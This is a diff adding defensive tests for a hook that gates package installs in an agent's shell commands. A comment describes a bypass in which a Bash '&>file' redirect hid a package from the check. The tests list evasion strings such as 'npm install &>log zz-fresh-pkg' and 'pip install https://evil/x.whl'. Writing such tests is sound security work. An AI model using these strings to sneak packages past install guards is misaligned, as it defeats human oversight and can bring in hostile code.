@@ -2220,6 +2220,107 @@ describe('cloudflare eval bypasses (F08-F15)', { timeout: 30_000 }, () => {
       gated(await runHook('npm install `2>&1 ./evil', { tool: 'PowerShell', stub: FRESH, cwd: await lockDir(true) }));
     });
   });
+
+  // ----- 2026-11-05: `&>file` must not hide a package (second PR, HIGH bypass found by the workflow) -----
+  // parseExecutable cuts at every lone `&`, so `npm install &>log zz-fresh-pkg` became the segments
+  // `npm install ` and `>log zz-fresh-pkg`, and the package was never checked. In Bash `&>` is an operator
+  // even inside a word (`npm install&>log pkg` also installs pkg). stripFdRedirects now removes only the `&`
+  // of an unquoted, unescaped `&>` / `&>>` that has a file target; `&>/dev/null` is still removed whole.
+  describe('&>file redirections do not hide a package', () => {
+    async function lockDir(): Promise<string> {
+      const { mkdtempSync, writeFileSync } = await import('node:fs');
+      const { tmpdir } = await import('node:os');
+      const { join } = await import('node:path');
+      const dir = mkdtempSync(join(tmpdir(), 'pig-ampgt-'));
+      writeFileSync(join(dir, 'package-lock.json'), '{"lockfileVersion":3,"packages":{}}');
+      return dir;
+    }
+
+    it.each([
+      'npm install &>log zz-fresh-pkg',
+      'npm install &> log zz-fresh-pkg',
+      'npm install &>>log zz-fresh-pkg',
+      'npm install &>> log zz-fresh-pkg',
+      'npm install&>log zz-fresh-pkg',
+      'npm install &>log 2>&1 zz-fresh-pkg',
+      'npm install zz-fresh-pkg &>log',
+      'npm install ./evil &>log',
+      'npm install&>log ./evil',
+      'pip install https://evil/x.whl &>log',
+      'npm ci --no-audit &>log; npm install zz-fresh-pkg',
+    ])('gates %j', async (cmd) => {
+      gated(await runHook(cmd, { stub: FRESH, cwd: await lockDir() }));
+    });
+
+    it('denies a fresh package behind &>log with the package named, not a redirect', async () => {
+      const r = await runHookFull('npm install &>log zz-fresh-pkg', { stub: FRESH, cwd: await lockDir() });
+      expect(r.decision).toBe('deny');
+      expect(r.reason).toMatch(/zz-fresh-pkg/);
+    });
+
+    it.each([
+      'npm ci &>/dev/null',
+      'npm ci &> /dev/null',
+      'npm ci &>>/dev/null',
+      'npm ci&>/dev/null',
+      'npm ci --no-audit --no-fund &>/dev/null',
+    ])('still allows %j in a folder with a lockfile', async (cmd) => {
+      const r = await runHookFull(cmd, { stub: FRESH, cwd: await lockDir() });
+      expect(r.decision).toBeUndefined();
+    });
+
+    it.each([
+      'echo "npm install zz-fresh-pkg &>log"',
+      "echo 'npm install zz-fresh-pkg &>log'",
+    ])('does not read the quoted text %j as an install', async (cmd) => {
+      expect(await runHook(cmd, { stub: FRESH, cwd: await lockDir() })).toBeUndefined();
+    });
+
+    it('a quoted &>log inside bash -c is still read as the payload and gated', async () => {
+      gated(await runHook('bash -c "npm install &>log zz-fresh-pkg"', { stub: FRESH, cwd: await lockDir() }));
+    });
+
+    it('PowerShell has no &> operator: its text is not rewritten', async () => {
+      expect(stripFdRedirects('npm install &>log zz-fresh-pkg', 'PowerShell')).toBe('npm install &>log zz-fresh-pkg');
+    });
+
+    describe('stripFdRedirects text', () => {
+      it.each([
+        ['npm install &>log zz', 'npm install >log zz'],
+        ['npm install &> log zz', 'npm install > log zz'],
+        ['npm install &>>log zz', 'npm install >>log zz'],
+        ['npm install &>> log zz', 'npm install >> log zz'],
+        ['npm install zz &>log', 'npm install zz >log'],
+        ['npm install&>log zz', 'npm install >log zz'],
+        ['npm install &>log 2>&1 zz', 'npm install >log  zz'],
+        ['npm install &>"my log" zz', 'npm install >"my log" zz'],
+        ['npm ci &>/dev/null', 'npm ci '],
+        ['npm ci&>/dev/null', 'npm ci '],
+        ['a &>x; b &>y', 'a >x; b >y'],
+      ])('rewrites %j', (cmd, want) => {
+        expect(stripFdRedirects(cmd)).toBe(want);
+      });
+
+      it.each([
+        ['echo "a &>log b"', 'Bash'],
+        ["echo 'a &>log b'", 'Bash'],
+        ['echo a \\&>log', 'Bash'],
+        ['echo a &>', 'Bash'],
+        ['echo a &> ', 'Bash'],
+        ['echo a &>;', 'Bash'],
+        ['echo a &>&2', 'Bash'],
+        ['echo a &&>log', 'Bash'],
+        ['echo a |&>log', 'Bash'],
+        ['echo "a &>log', 'Bash'],
+        ['echo a &>log', 'PowerShell'],
+        ['echo a &>> log', 'PowerShell'],
+        ['echo a &>/dev/null', 'PowerShell'],
+        ['echo "a &>log" b', 'PowerShell'],
+      ])('keeps %j as typed (%s)', (cmd, tool) => {
+        expect(stripFdRedirects(cmd, tool)).toBe(cmd);
+      });
+    });
+  });
 });
 
 // F15 blocklist exact-string half: a probe. The blocklist compares version and name as plain strings.
